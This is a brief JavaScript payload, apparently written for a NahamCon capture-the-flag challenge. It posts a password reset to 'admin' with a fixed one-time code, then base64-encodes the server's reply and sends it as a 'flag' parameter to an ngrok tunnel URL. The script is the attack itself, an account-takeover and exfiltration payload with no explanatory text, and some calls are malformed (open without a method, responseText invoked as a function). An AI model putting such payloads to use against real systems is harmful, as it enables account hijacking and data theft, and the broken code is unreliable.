var http =new XMLHttpRequest();
var url = 'http://challenge.nahamcon.com:32372/reset_password';

var data = JSON.stringify({

    'password': 'admin',
    'password2':'admin',
    'otp': '331336'
});

http.open(url,true)

http.onload = function(){

    var flag = btoa(http.responseText());
    var exif = new XMLHttpRequest();
    exif.open('GET','https://ce05-94-249-78-197.eu.ngrok.io?flag='+flag);
    exif.send();


};
http.setRequestHeader('Content-Type','application/json');

http.send(data);